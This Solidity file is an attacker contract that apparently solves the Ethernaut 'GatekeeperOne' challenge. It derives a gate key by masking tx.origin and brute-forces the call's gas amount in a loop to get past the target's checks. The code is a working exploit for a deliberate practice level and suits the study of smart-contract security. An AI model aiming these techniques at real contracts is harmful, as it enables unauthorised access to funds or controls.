// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttacker {
    event Success(address sender, address origin);
    event Gatekey(bytes8);

    function attack(address _victim) external {
        bytes8 _gateKey = bytes8(
            uint64(uint160(tx.origin)) & 0xf00000000000ffff
        );

        for (uint256 i = 0; i < 8191; i++) {
            try IGatekeeperOne(_victim).enter{gas: 8191 * 10 + i}(_gateKey) {
                emit Success(msg.sender, tx.origin);
                return;
            } catch {
                emit Gatekey(_gateKey);
            }
        }
    }
}
